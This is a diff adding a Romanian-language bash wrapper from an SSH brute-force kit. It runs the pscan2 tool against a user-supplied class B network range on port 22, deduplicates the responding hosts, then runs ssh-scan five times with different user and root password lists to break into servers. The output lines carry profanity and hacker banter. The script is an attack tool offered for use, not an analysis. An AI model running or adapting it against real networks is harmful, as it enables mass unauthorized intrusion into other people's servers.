@@ -1,0 +1,60 @@
+BLK=';30m'
+RED=';31m'
+GRN=';32m'
+YEL=';33m'
+BLU=';34m'
+MAG=';35m'
+CYN=';36m'
+WHI=';37m'
+DRED='0;31m'
+DGRN='0;32m'
+DYEL='0;33m'
+DBLU='0;34m'
+DMAG='0;35m'
+DCYN='0;36m'
+DWHI='0;37m'
+RES='0m'
+
+#!/bin/bash
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+
+
+echo -e "\033[1;31m«\033[1;32m Created by snok \033[1;31m»\033[0m"
+echo "INCERC SA DAU VIATZA CIBERNETICI"
+
+
+./pscan2 $1 22 
+
+sleep 10
+cat $1.pscan.22 |sort |uniq > mfu.txt
+oopsnr2=`grep -c . mfu.txt`
+echo "# SA VEDEM CE PULA MEA FACEM"
+echo "# 	 _\ ____) \_______  " 
+echo "# 	(_)[_bY_]{}<zRR> "
+echo "#         /     )_/         " 
+echo "#.......si DE root  ....... "
+echo "                            "
+echo -e "Checking\033[1;34m user file\033[0m pass 1"
+cp 1 pass_file
+./ssh-scan 100
+sleep 3
+echo -e "Checking\033[1;31m root file\033[0m pass 2"
+cp 2 pass_file
+./ssh-scan 100
+sleep 3
+echo -e "Checking\033[1;34m user file\033[0m pass 3"
+cp 3 pass_file
+./ssh-scan 100
+sleep 3
+echo -e "Checking\033[1;34m user file\033[0m pass 4"
+cp 4 pass_file
+./ssh-scan 100
+sleep 3
+echo -e "Checking\033[1;31m root file\033[0m pass 5"
+cp 5 pass_file
+./ssh-scan 100
+rm -rf $1.pscan.22 mfu.txt
+echo -e "\033[1;31m«\033[1;32mFuck .. continuam .. \033[1;31m»\033[0m"
